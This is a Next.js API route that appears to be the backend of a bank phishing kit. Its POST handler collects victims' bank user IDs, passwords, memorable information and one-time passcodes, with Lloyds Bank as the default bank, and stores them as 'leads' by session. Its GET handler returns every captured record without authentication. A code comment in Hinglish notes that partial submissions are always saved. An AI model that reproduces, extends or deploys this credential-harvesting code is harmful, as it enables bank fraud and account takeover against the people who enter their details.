import { NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const leads = await prisma.lead.findMany({
      orderBy: { createdAt: "desc" },
    });
    return NextResponse.json({ success: true, data: leads });
  } catch (error) {
    return NextResponse.json({ success: false, error: "Failed to fetch leads" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { sessionId, bankName, bankType, userId, password, memorableInfo, otpCode, extraData } = body;

    let lead;

    // Agar sessionId hai toh upsert karo, warna seedha naya record create karo (400 error kabhi nahi aayega)
    if (sessionId) {
      lead = await prisma.lead.upsert({
        where: { sessionId },
        update: {
          ...(bankName && { bankName }),
          ...(bankType && { bankType }),
          ...(userId !== undefined && { userId }),
          ...(password !== undefined && { password }),
          ...(memorableInfo !== undefined && { memorableInfo }),
          ...(otpCode !== undefined && { otpCode }),
          ...(extraData && { extraData }),
        },
        create: {
          sessionId,
          bankName: bankName || "Lloyds Bank",
          bankType: bankType || "Personal",
          userId: userId || "",
          password: password || "",
          extraData: extraData || "Bank Selected",
        },
      });
    } else {
      lead = await prisma.lead.create({
        data: {
          bankName: bankName || "Lloyds Bank",
          bankType: bankType || "Personal",
          userId: userId || "",
          password: password || "",
          extraData: extraData || "Bank Selected",
        },
      });
    }

    return NextResponse.json({ success: true, data: lead });
  } catch (error) {
    console.error("POST Lead Error:", error);
    return NextResponse.json({ success: false, error: "Failed to save lead" }, { status: 500 });
  }
}